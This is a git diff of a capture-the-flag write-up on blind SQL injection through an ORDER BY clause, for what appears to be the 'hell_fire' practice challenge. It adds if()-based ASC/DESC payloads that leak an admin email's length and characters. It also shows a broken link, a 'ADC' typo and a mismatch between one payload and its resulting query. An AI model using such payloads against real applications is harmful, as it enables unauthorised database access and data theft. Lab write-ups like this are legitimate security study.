@@ -5,7 +5,7 @@ pagination_prev: null
 sidebar_position: 24
 ---
 
-![[1 190.png]]
+![1](https://github.com/Kunull/Write-ups/assets/110326359/4c5c1b89-930a-41e5-ae0f-a0b7f4fcceab)
 
 We are provided with the SQL queries:
 
@@ -31,14 +31,15 @@ The resultant query becomes:
 SELECT id,email,score FROM prob_hell_fire WHERE 1 ORDER BY id
 ```
 
-![[2 207.png]]
+![2](https://github.com/Kunull/Write-ups/assets/110326359/d9f2eff9-6616-47e7-b691-7735f440149d)
 
 As we can see there are two users: `admin` and `rubiya`.
 In this challenge, the users are sorted in the same way regardless if we order by `id` or `score`.
 
-Therefore we will have to solve this using two different methods:
-1. Assigning sort value
-2. Sorting by ASC or DESC
+We can solve this using two different methods:
+
+- [Assigning sort value](#blind-sql-injection---assigning-different-sort-value)
+- [Sorting by ASC or DESC](
 
 ## Blind SQL Injection - (Assigning different sort value)
 
@@ -266,3 +267,41 @@ _@.0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ
 [!] Extracted email: aasup3r_secure_email@emai1.com
 [!] Final payload: ?email=aasup3r_secure_email@emai1.com
 ```
+
+## Blind SQL Injection - (Sorting by ADC or DESC)
+
+### Retrieving the email length
+
+If we provide the following URI parameter:
+
+```
+?order=if(id='admin' AND length(email)=[length], '1 ASC', '1 DESC')
+```
+
+The resultant query becomes:
+
+```sql
+SELECT id,email,score FROM prob_hell_fire WHERE 1 ORDER BY if(id='admin' AND length(email)=[length], '1 ASC', '1 DESC')
+```
+
+If the length of `email` for `id='admin'` is equal to the `[length]` that we provide, the rows will be sorted in ascending order. Otherwise, the rows will be sorted in descending order.
+
+So, if the `admin` user appears first, we know that the `[length]` was correct.
+
+### Leaking the email
+
+If we provide the following URI parameter:
+
+```
+?order=if(id='admin' AND substr(email, 1, 1)='0', '1 ASC', '1 DESC')
+```
+
+The resultant query becomes:
+
+```sql
+SELECT id,email,score FROM prob_hell_fire WHERE 1 ORDER BY if(id='admin' AND ord(substr(email, [index], 1))='ord([character])', '1 ASC', '1 DESC')
+```
+
+If the `id='admin'` and character of the `email` at `[index]` is the same as the `[character]` that we provide, the rows will be sorted in ascending order. Otherwise, the rows will be sorted in descending order.
+
+So, if the `admin` user appears first, we know that the `[character]` at `[index]` was correct.
